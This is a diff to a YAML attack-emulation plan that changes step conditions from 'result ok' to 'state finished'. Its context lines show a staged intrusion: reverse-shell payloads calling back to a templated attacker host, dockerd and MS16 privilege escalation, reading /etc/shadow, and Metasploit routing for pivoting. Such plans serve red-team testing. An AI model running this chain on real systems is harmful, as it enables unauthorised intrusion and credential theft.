@@ -49,8 +49,8 @@ stages:
             LHOST: {{ attacker.host }}
             LPORT: 4445
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: exploit-dockerd-privesc
 
       exploit-dockerd-privesc:
@@ -85,8 +85,8 @@ stages:
           command: sysinfo
           force_shell: false
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: ubuntu-get-etc-shadow
 
       ubuntu-get-etc-shadow:
@@ -98,8 +98,8 @@ stages:
           session_id: $exploit-dockerd-privesc.session_id
           command: cat /etc/shadow
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: ubuntu-get-process-list
 
       ubuntu-get-process-list:
@@ -129,8 +129,8 @@ stages:
           session_id: $exploit-dockerd-privesc.session_id
           command: ifconfig
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: update-msf-routing-table
 
       update-msf-routing-table:
@@ -190,8 +190,8 @@ stages:
             LHOST: {{ attacker.host }}
             LPORT: 4447
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: exploit-ms16-reflection-juicy
 
       exploit-ms16-reflection-juicy:
@@ -225,8 +225,8 @@ stages:
           session_id: $exploit-ms16-reflection-juicy.session_id
           command: whoami /all
         next:
-          - type: result
-            value: ok
+          - type: state
+            value: finished
             step: get-tasklist
 
       get-tasklist:
